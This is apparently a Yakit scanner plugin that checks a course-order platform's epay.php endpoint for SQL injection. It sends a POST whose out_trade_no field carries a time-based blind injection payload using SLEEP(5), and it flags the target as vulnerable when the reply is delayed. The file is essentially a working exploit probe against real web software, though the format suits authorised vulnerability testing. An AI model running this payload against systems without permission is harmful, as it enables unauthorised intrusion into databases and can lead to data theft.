yakit.AutoInitYakit()
loglevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    packet = `
POST /epay/epay.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close
 
out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(5)))eEcA) AND 'aEmC'='aEmC

`
    begon_time = time.now()
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(8),
    )
    resp_time = time.Since(begon_time)
    //dump(rsp)
    if int(resp_time) > 5000000000{
        risk.NewRisk(
            target, risk.severity("high"), 
            risk.title(f"网课交单平台epay.php SQL注入漏洞 "),
            risk.titleVerbose(" 网课交单平台epay.php SQL注入漏洞 "),
            risk.request(req),
            risk.response(rsp),
            risk.cve("no cve"),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
